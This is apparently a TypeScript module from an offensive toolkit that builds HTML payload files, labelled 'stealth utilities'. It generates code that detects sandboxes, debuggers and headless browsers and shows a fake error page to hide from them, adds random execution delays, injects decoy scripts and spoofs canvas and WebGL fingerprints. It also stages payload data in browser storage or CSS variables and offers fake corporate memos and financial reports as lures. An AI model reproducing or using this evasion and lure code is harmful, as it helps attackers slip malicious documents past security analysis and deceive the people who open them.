// Advanced stealth utilities for HTML payload generation

// Code obfuscation utilities
export function obfuscateString(str: string): string {
  // Split string into chunks and reassemble with concatenation
  const chunks = str.match(/.{1,8}/g) || [str];
  return chunks.map(chunk => `"${chunk}"`).join('+');
}

export function obfuscateVariableName(name: string): string {
  // Generate random variable name
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Anti-analysis techniques
export function generateAntiAnalysisCode(): string {
  return `
    // Anti-analysis checks
    function isAnalysisEnvironment() {
      // Check for common analysis tools
      if (window.phantom || window._phantom || window.callPhantom) return true;
      if (window.selenium || window.webdriver) return true;
      if (window.domAutomation || window.domAutomationController) return true;
      
      // Check timing attack
      const start = performance.now();
      debugger;
      const end = performance.now();
      if ((end - start) > 100) return true;
      
      // Check viewport
      if (window.outerHeight === 0 || window.outerWidth === 0) return true;
      
      // Check user agent
      const ua = navigator.userAgent.toLowerCase();
      if (ua.includes('headless') || ua.includes('bot') || ua.includes('crawler')) return true;
      
      return false;
    }
    
    if (isAnalysisEnvironment()) {
      // Display fake content and exit
      document.body.innerHTML = '<h1>Document Not Found</h1><p>The requested document could not be loaded.</p>';
      throw new Error('Environment not supported');
    }
  `;
}

// Random delay generators
export function generateRandomDelay(): string {
  const delays = [1000, 1500, 2000, 2500, 3000];
  const randomDelay = delays[Math.floor(Math.random() * delays.length)];
  return `
    // Random execution delay
    await new Promise(resolve => setTimeout(resolve, ${randomDelay} + Math.random() * 1000));
  `;
}

// Fake content templates
export function generateFakeContent(): { title: string; content: string } {
  const templates = [
    {
      title: "Corporate Security Policy Update",
      content: `
        <div style="max-width: 800px; margin: 0 auto; padding: 20px; font-family: Arial, sans-serif;">
          <h1>Security Policy Update - Q4 2024</h1>
          <p>Dear Team Members,</p>
          <p>We are implementing updated security protocols effective immediately. Please review the following changes:</p>
          <ul>
            <li>Enhanced password requirements (minimum 12 characters)</li>
            <li>Mandatory two-factor authentication for all accounts</li>
            <li>Updated VPN configuration requirements</li>
            <li>New incident reporting procedures</li>
          </ul>
          <p>These updates are part of our ongoing commitment to maintaining the highest security standards.</p>
          <p>If you have any questions, please contact the IT Security team.</p>
          <p>Best regards,<br>IT Security Department</p>
        </div>
      `
    },
    {
      title: "Financial Report Summary",
      content: `
        <div style="max-width: 800px; margin: 0 auto; padding: 20px; font-family: Arial, sans-serif;">
          <h1>Quarterly Financial Summary</h1>
          <p>Executive Summary for Q3 2024</p>
          <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
            <tr style="background: #f0f0f0;">
              <th style="border: 1px solid #ddd; padding: 8px;">Metric</th>
              <th style="border: 1px solid #ddd; padding: 8px;">Q3 2024</th>
              <th style="border: 1px solid #ddd; padding: 8px;">Q2 2024</th>
            </tr>
            <tr>
              <td style="border: 1px solid #ddd; padding: 8px;">Revenue</td>
              <td style="border: 1px solid #ddd; padding: 8px;">$2.4M</td>
              <td style="border: 1px solid #ddd; padding: 8px;">$2.1M</td>
            </tr>
            <tr>
              <td style="border: 1px solid #ddd; padding: 8px;">Operating Expenses</td>
              <td style="border: 1px solid #ddd; padding: 8px;">$1.8M</td>
              <td style="border: 1px solid #ddd; padding: 8px;">$1.7M</td>
            </tr>
          </table>
          <p>Full report available in the attachment below.</p>
        </div>
      `
    },
    {
      title: "Project Documentation",
      content: `
        <div style="max-width: 800px; margin: 0 auto; padding: 20px; font-family: Arial, sans-serif;">
          <h1>Project Phoenix - Documentation</h1>
          <h2>Overview</h2>
          <p>This document contains the technical specifications and implementation details for Project Phoenix.</p>
          
          <h3>System Requirements</h3>
          <ul>
            <li>Server: Ubuntu 20.04 LTS or higher</li>
            <li>Database: PostgreSQL 13+</li>
            <li>Runtime: Node.js 18+</li>
            <li>Memory: Minimum 8GB RAM</li>
          </ul>
          
          <h3>Installation Instructions</h3>
          <p>Follow these steps to set up the development environment:</p>
          <ol>
            <li>Clone the repository</li>
            <li>Install dependencies</li>
            <li>Configure environment variables</li>
            <li>Run database migrations</li>
          </ol>
          
          <p>For detailed instructions, download the complete documentation package.</p>
        </div>
      `
    }
  ];
  
  return templates[Math.floor(Math.random() * templates.length)];
}

// Storage method generators
export function generateStorageCode(method: string, data: string, key: string): string {
  switch (method) {
    case 'localStorage':
      return `
        localStorage.setItem('${obfuscateVariableName('data')}', '${data}');
        const ${obfuscateVariableName('payload')} = localStorage.getItem('${obfuscateVariableName('data')}');
      `;
    
    case 'sessionStorage':
      return `
        sessionStorage.setItem('${obfuscateVariableName('data')}', '${data}');
        const ${obfuscateVariableName('payload')} = sessionStorage.getItem('${obfuscateVariableName('data')}');
      `;
    
    case 'indexedDB':
      return `
        const ${obfuscateVariableName('db')} = await new Promise((resolve, reject) => {
          const request = indexedDB.open('${obfuscateVariableName('store')}', 1);
          request.onerror = () => reject(request.error);
          request.onsuccess = () => resolve(request.result);
          request.onupgradeneeded = (event) => {
            const db = event.target.result;
            if (!db.objectStoreNames.contains('${obfuscateVariableName('data')}')) {
              db.createObjectStore('${obfuscateVariableName('data')}');
            }
          };
        });
        
        const ${obfuscateVariableName('transaction')} = ${obfuscateVariableName('db')}.transaction(['${obfuscateVariableName('data')}'], 'readwrite');
        const ${obfuscateVariableName('store')} = ${obfuscateVariableName('transaction')}.objectStore('${obfuscateVariableName('data')}');
        ${obfuscateVariableName('store')}.put('${data}', '${key}');
        
        const ${obfuscateVariableName('payload')} = await new Promise((resolve, reject) => {
          const request = ${obfuscateVariableName('store')}.get('${key}');
          request.onerror = () => reject(request.error);
          request.onsuccess = () => resolve(request.result);
        });
      `;
    
    default: // CSS
      return `
        const ${obfuscateVariableName('payload')} = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);
      `;
  }
}

// Advanced DOM manipulation
export function generateDOMEvasion(): string {
  return `
    // DOM manipulation for evasion
    function ${obfuscateVariableName('createDecoy')}() {
      const ${obfuscateVariableName('decoys')} = [
        'script[src*="analytics"]',
        'script[src*="tracking"]', 
        'script[src*="metrics"]'
      ];
      
      ${obfuscateVariableName('decoys')}.forEach(selector => {
        const ${obfuscateVariableName('element')} = document.createElement('script');
        ${obfuscateVariableName('element')}.src = 'data:application/javascript;base64,Ly8gRGVjb3kgc2NyaXB0';
        ${obfuscateVariableName('element')}.async = true;
        document.head.appendChild(${obfuscateVariableName('element')});
      });
    }
    
    ${obfuscateVariableName('createDecoy')}();
  `;
}

// Environment fingerprinting evasion
export function generateFingerprintEvasion(): string {
  return `
    // Fingerprinting evasion
    function ${obfuscateVariableName('evadeFingerprinting')}() {
      // Override canvas fingerprinting
      const ${obfuscateVariableName('originalToDataURL')} = HTMLCanvasElement.prototype.toDataURL;
      HTMLCanvasElement.prototype.toDataURL = function() {
        const ${obfuscateVariableName('context')} = this.getContext('2d');
        ${obfuscateVariableName('context')}.fillStyle = 'rgba(' + Math.floor(Math.random()*256) + ',' + Math.floor(Math.random()*256) + ',' + Math.floor(Math.random()*256) + ',0.1)';
        ${obfuscateVariableName('context')}.fillRect(0, 0, this.width, this.height);
        return ${obfuscateVariableName('originalToDataURL')}.apply(this, arguments);
      };
      
      // Override WebGL fingerprinting
      const ${obfuscateVariableName('getParameter')} = WebGLRenderingContext.prototype.getParameter;
      WebGLRenderingContext.prototype.getParameter = function(parameter) {
        if (parameter === 37445) return 'Generic Renderer';
        if (parameter === 37446) return 'Generic Vendor';
        return ${obfuscateVariableName('getParameter')}.apply(this, arguments);
      };
    }
    
    ${obfuscateVariableName('evadeFingerprinting')}();
  `;
}